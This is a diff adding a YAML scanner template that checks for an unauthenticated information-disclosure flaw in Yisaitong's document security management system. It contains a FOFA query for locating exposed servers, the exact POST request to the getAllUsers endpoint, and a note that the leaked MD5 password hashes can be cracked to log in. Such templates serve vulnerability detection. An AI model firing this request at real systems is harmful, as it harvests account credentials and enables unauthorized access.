@@ -1,0 +1,27 @@
+id: yisaitong-getallusers-disclosure
+
+info:
+  name: 亿赛通电子文档安全管理系统 getAllUsers 信息泄露漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: body="/CDGServer3/index.jsp"
+    亿赛通电子文档安全管理系统 /CDGServer3/openapi/getAllUsers 接口处存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取后台账号密码等敏感信息，进一步MD5解密即可登录后台，使系统处于极不安全的状态。
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486682&idx=1&sn=668809e5f2f46672da6cf65f924a2697&chksm=c267b9e9f51030ff79539087a735c4a95094cc4a94528a5e6521769d9e74903c9fc1a3d94d55&token=522460222&lang=zh_CN#rd
+  tags: Information disclosure
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /CDGServer3/openapi/getAllUsers
+      body: pageSize=100&pageNumber=1
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'password') && 
+      response.body.bcontains(b'username') &&
+      response.body.bcontains(b'"code":0') &&
+      response.body.bcontains(b'surname') &&
+      response.body.bcontains(b'mobilephone')
+expression: r0()
